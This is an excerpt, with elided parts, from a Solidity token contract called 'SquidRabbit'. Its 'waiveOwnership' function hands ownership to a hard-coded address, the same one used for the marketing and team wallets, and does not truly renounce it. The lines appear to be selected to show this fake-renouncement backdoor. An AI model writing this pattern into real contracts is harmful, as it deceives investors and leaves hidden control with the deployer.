...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x87C0D36C2229e9789d6637D1B7bB48a99956308d);
    }
...
contract SquidRabbit is Context, IERC20, Ownable {
    ...
    string private _symbol = "SquidRabbit";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x87C0D36C2229e9789d6637D1B7bB48a99956308d);
    address payable public teamWalletAddress = payable(0x87C0D36C2229e9789d6637D1B7bB48a99956308d);
